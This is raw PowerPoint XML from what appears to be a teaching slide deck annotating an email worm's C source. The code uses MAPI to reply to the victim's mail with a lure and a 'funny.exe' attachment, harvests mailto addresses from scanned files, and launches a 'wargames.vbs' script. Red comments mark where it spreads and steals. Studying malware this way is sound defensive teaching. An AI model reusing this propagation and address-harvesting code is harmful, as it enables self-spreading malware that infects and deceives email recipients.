              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>c%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> Then\n", 34, 34);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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>EM.Send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>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"End If\n");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"Next\n");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"End If\n");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, "Next\n");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vbsworm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ShellExecute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(NULL, "open", "wargames.vbs", NULL, NULL, SW_SHOWNORMAL);//execute the script.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="265191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B249A5-2656-A2BE-1B29-1B714CA861AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1217221"/>
            <a:ext cx="12192000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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mFindNext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(session, 0, NULL, NULL, MAPI_LONG_MSGID, NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>messId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>) == SUCCESS_SUCCESS) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		do {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mReadMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(session, NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>messId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, MAPI_ENVELOPE_ONLY | MAPI_PEEK, NULL, &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>) == SUCCESS_SUCCESS) {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mname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, 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lpszName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maddr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, 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lpszAddress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ulReserved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lpszSubject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = "Re: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Fw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>:";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lpszNoteText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = "I received your mail but I cannot reply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>immediatly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>.\n"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>					"I send you a nice program. Look at this.\n\n"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>					"	See you soon.";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lpszMessageType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lpszDateReceived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lpszConversationID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flFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = MAPI_SENT;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ulReserved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ulRecipClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = MAPI_ORIG;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lpszName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = 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lpszName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lpOriginator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lpszAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = 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lpszAddress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nRecipCount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = 1;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ulReserved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ulRecipClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = MAPI_TO;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lpszName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mname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lpRecips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lpszAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>maddr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nFileCount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = 1;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 = (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>MapiFileDesc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*)malloc(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MapiFileDesc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memset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(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, 0,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MapiFileDesc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-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ulReserved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-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>flFlags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-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>nPosition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = -1;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>				</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mes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lpFiles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lpszPathName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = filename;//it send the malware to the recipient.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	//but I wonder that it has sent a malware to the recipient by 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wargames.vbs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>”, why need to send another mail to others.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	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mes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lpFiles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lpszFileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = "funny.exe";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mes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lpFiles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lpFileType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mSendMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(session, NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, NULL, NULL);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		} while (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mFindNext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(session, 0, NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>messId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, MAPI_LONG_MSGID, NULL, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>messId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>) == SUCCESS_SUCCESS);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5522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800730-8686-6358-325E-B04249CC9F68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1306286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FindFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(char* folder, char* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ext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register bool </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = TRUE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	register HANDLE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hFile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char mail[128];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SetCurrentDirectory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(folder);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hFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>FindFirstFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ffile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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> != INVALID_HANDLE_VALUE) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		while (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>abc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SetFileAttributes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ffile.cFileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, FILE_ATTRIBUTE_ARCHIVE);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GetMail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ffile.cFileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, mail);//steal the information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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>strlen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(mail) &gt; 0) {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	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sendmail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(mail);//send the information.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	}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		//it steals the content of the mail and sends it to attacker.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abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>FindNextFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ffile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}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54873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8BE7AE-347A-DD09-D995-5E4111C3CBD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1240971"/>
            <a:ext cx="12192000" cy="1782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//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>有个问题，扫描的文件里面为什么会有邮件的相关信息？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>//Function to find the address of the recipients that the victim has sent mails to.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>GetMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(char* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>namefile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, char* mail)//get the information(address) of the recipients.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HANDLE	hf, hf2;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	char* mapped;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	DWORD	size, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, k;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	BOOL	test = FALSE, valid = FALSE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	mail[0] = 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	hf = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>CreateFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>namefile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	if (hf == INVALID_HANDLE_VALUE)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size = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>GetFileSize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf, NULL);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	if (!size)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if (size &lt; 8)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size -= 100;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	hf2 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>CreateFileMapping</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf, 0, PAGE_READONLY, 0, 0, 0);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	if (!hf2) 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CloseHandle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf);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mapped = (char*)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>MapViewOfFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf2, FILE_MAP_READ, 0, 0, 0);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	if (!mapped) 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CloseHandle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf2);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CloseHandle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf);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	while (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> &lt; size &amp;&amp; !test) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		if (!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>strncmpi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("mailto:", mapped + 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strlen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("mailto:"))) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			test = TRUE;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i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> += </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>strlen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("mailto:");//find the mail header.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			k = 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			while (mapped[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>] != 34 &amp;&amp; mapped[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>] != 39 &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> &lt; size &amp;&amp; k &lt; 127)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>				if (mapped[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>] != ' ') </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>				{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>					mail[k] = mapped[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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>					k++;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>					if (mapped[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>] == '@')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>						valid = TRUE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>				}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>				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</a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>			mail[k] = 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		else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if (!valid)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		mail[0] = 0;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UnmapViewOfFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(mapped);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CloseHandle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf2);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CloseHandle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(hf);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	return;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04376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Quiz1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9A8430-5264-CB72-ACFF-9FA44BCFE52C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1543792"/>
            <a:ext cx="12192000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sendmail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(char* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>tos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memset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(&amp;mess, 0,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MapiMessage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memset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(&amp;from, 0,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MapiRecipDesc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wsprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(subj, "Mail to %s.", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>tos</a:t>
            </a:r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from.lpszName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = NULL;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from.ulRecipClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = MAPI_ORIG;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mess.lpszSubject</a:t>
            </a:r>
            <a:r>
